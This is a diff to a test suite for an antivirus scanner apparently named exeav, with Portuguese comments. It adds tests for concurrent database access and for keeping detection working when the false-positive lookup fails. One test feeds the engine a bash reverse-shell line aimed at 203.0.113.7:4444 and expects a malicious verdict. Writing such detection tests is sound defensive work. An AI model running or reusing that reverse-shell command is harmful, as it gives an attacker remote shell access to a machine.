@@ -267,7 +267,7 @@ def test_scanner_survives_worker_crash(tmp_path, monkeypatch):
     s.use_cache = False
     st = sc.Scanner(Engine(s), "custom", [str(d)]).run()
     assert st.files == 8
-    assert [os.path.basename(r.path) for r in st.threats] == ["ameaca.com"]
+    assert [os.path.basename(r.path) for r in st.threats] == ["ameaca.com"], st.skipped_items
     assert st.skipped >= 1
 
 
@@ -290,5 +290,37 @@ def test_scanner_never_loses_threats_when_other_files_crash(tmp_path, monkeypatc
     s.scan_processes = True
     s.use_cache = False
     st = sc.Scanner(Engine(s), "custom", [str(d)]).run()
-    assert sorted(os.path.basename(r.path) for r in st.threats) == ["ameaca0.com", "ameaca1.com", "ameaca2.com"]
+    assert sorted(os.path.basename(r.path) for r in st.threats) == ["ameaca0.com", "ameaca1.com", "ameaca2.com"], \
+        st.skipped_items
     assert st.skipped == 3
+
+
+def _open_fp_db_concurrently(data_dir):
+    os.environ["EXEAV_DATA_DIR"] = data_dir
+    from exeav import fpengine
+    for _ in range(20):
+        fpengine.reset_for_tests()
+        fpengine.lookup("a" * 64)
+    return "ok"
+
+
+def test_database_in_use_is_not_treated_as_corrupted(tmp_path):
+    """Vários processos abrindo o mesmo banco ao mesmo tempo: 'database is locked' é espera, não corrupção
+    (antes o banco era renomeado como corrompido — decisões do usuário podiam sumir — e a análise falhava)."""
+    import multiprocessing
+    from concurrent.futures import ProcessPoolExecutor
+    d = str(tmp_path / "dados")
+    os.makedirs(d)
+    with ProcessPoolExecutor(6, mp_context=multiprocessing.get_context("spawn")) as ex:
+        assert list(ex.map(_open_fp_db_concurrently, [d] * 12)) == ["ok"] * 12
+    assert not [f for f in os.listdir(d) if "corrompido" in f]
+
+
+def test_false_positive_subsystem_failure_never_disables_detection(engine, monkeypatch):
+    from exeav import fpengine
+
+    def boom(_sha):
+        raise RuntimeError("banco indisponível")
+    monkeypatch.setattr(fpengine, "lookup", boom)
+    r = engine.analyze(b"#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.7/4444 0>&1\n", ftype="script").result
+    assert r.verdict == "malicioso"
